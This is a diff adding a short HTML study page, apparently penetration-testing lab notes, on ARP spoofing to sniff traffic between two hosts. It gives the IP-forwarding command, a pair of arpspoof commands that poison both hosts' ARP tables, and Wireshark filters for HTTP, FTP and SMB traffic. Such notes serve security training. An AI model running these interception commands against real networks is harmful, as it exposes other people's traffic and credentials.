@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>arpspoof: sniff traffic between hosts</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>arpspoof: sniff traffic between hosts</h1><br/><br /><br />Enable Ip Forwarding on the Attacker System<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">echo</span> 1 &gt; <span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span>sys<span style="color:#ff9d00;font-weight:700">/</span>net<span style="color:#ff9d00;font-weight:700">/</span>ipv4<span style="color:#ff9d00;font-weight:700">/</span>ip_forward</pre></div><br /><br />1. <strong>Capture/Sniff traffic between 172.16.5.5 and 172.16.5.1</strong><br />Send the following commands in two different terminals. Arpspoof will keep sending ARP packets to our targets in order to poison the<br />ARP table of both hosts.<br /><div class="codebox"><pre>arpspoof -i tap0 -t 172.16.5.5 -r 172.16.5.1</pre></div><br />    <a href=""><img src="images/2111-1.png" alt="images/2111-1.png" /></a><br />  <br /><div class="codebox"><pre>arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.5</pre></div><br />    <a href=""><img src="images/2111-2.png" alt="images/2111-2.png" /></a><br /><br />2. <strong>We can now analyze the traffic from Wireshark</strong><br />    Statistics → Protocol Hierarchy, to understand the type of traffic exchanged between the hosts<br />    <a href=""><img src="images/2111-3.png" alt="images/2111-3.png" /></a><br />   ◇ We can filter by:<br />       <div class="codebox"><pre>http.request.method == <span style="color:#3ad900;font-weight:400">&quot;GET&quot;</span><br />http.request.method == <span style="color:#3ad900;font-weight:400">&quot;POST&quot;</span><br /><span style="color:#ff9d00;font-weight:700">ftp</span><br />smb<br />smb.file        <span style="color:#0088ff;font-weight:400">#for file transmitted fia SMB</span><br /></pre></div><br />       If we have found an interesting request on Wireshark:<br />       Right click on the packet → Follow TCP Stream<br />       <a href=""><img src="images/2111-4.png" alt="images/2111-4.png" /></a><br />       <span style="color:#ff0000;">commands issued by the user are in red</span><br />       <span style="color:#1e90ff;">server responses are in blue</span></div>
+</body>
+</html>
